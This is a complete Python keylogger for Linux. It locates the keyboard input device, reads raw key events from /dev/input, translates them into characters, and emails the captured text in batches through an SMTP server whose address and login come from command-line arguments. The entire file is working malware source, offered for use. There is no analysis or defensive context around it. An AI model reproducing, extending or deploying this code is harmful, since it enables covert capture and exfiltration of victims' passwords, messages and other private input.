#!/usr/bin/env python3
# -*-coding:Latin-1 -*
#Jeffrey Monaco

import sys
import re
import struct
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib

#mapping for qwerty keyboard to interpret key strokes
qwerty_map = {
    2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9",
    11: "0", 12: "-", 13: "=", 14: "[BACKSPACE]", 15: "[TAB]", 16: "q", 17: "w",
    18: "e", 19: "r", 20: "t", 21: "y", 22: "u", 23: "i", 24: "o", 25: "p", 26: "^",
    27: "$", 28: "\n", 29: "[CTRL]", 30: "a", 31: "s", 32: "d", 33: "f", 34: "g",
    35: "h", 36: "j", 37: "k", 38: "l", 39: ";", 40: "ù", 41: "*", 42: "[SHIFT]",
    43: "<", 44: "z", 45: "x", 46: "c", 47: "v", 48: "b", 49: "n", 50: "m",
    51: ",", 52: ":", 53: "!", 54: "[SHIFT]", 55: "FN", 56: "ALT", 57: " ", 58: "[CAPSLOCK]",
}

USE_TLS = None
SERVER = None
EMAIL = None
BUF_SIZE = None
PASS = None
KEYBOARD = "qwerty"

#function to start email server and send message with desired character size
def sendEmail(message):
    msg = MIMEMultipart()

    password = PASS
    msg['From'] = EMAIL
    msg['To'] = EMAIL
    msg['Subject'] = "key Logger"

    msg.attach(MIMEText(message, 'plain'))

    server = smtplib.SMTP(SERVER)

    if USE_TLS is True:
        server.starttls()

    server.login(msg['From'], password)
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    server.quit()


def main():
    #read in all the devices that are connected to the machine
    with open("/proc/bus/input/devices") as f:
        lines = f.readlines()
        #find the events
        pattern = re.compile("Handlers|EV=")
        handlers = list(filter(pattern.search, lines))
        #find this specific event number that corresponds with a keyboard
        pattern = re.compile("EV=120013")
        for idx, elt in enumerate(handlers):
            if pattern.search(elt):
                line = handlers[idx - 1]
        pattern = re.compile("event[0-9]")
        infile_path = "/dev/input/" + pattern.search(line).group(0)

    FORMAT = 'llHHI'
    EVENT_SIZE = struct.calcsize(FORMAT)

    in_file = open(infile_path, "rb")
    #once it gathers the info from the event witht the keyboard it reads in the data from that event
    event = in_file.read(EVENT_SIZE)
    typed = ""
    
    #maps the data to the keyboard(human readable) then sends the email
    while event:
        (_, _, type, code, value) = struct.unpack(FORMAT, event)

        if code != 0 and type == 1 and value == 1:
            if code in qwerty_map:
                typed += qwerty_map[code]
        if len(typed) > BUF_SIZE:
            sendEmail(typed)
            #print(typed)

            typed = ""
        event = in_file.read(EVENT_SIZE)

    in_file.close()

#shows how to type in the command
def usage():
    print("Usage :python3 key_logger.py [your email] [your password] [smtp server] [tls/notls] [buffer_size]")

#function to gather the arguements from the command line
def init_arg():
    if len(sys.argv) < 5:
        usage()
        exit()
    global EMAIL
    global SERVER
    global USE_TLS
    global BUF_SIZE
    global PASS
    EMAIL = sys.argv[1]
    PASS = sys.argv[2]
    SERVER = sys.argv[3]
    if sys.argv[4] == "tls":
        USE_TLS = True
    else:
        USE_TLS = False
    BUF_SIZE = int(sys.argv[5])


if __name__ == "__main__":
    init_arg()
    main()
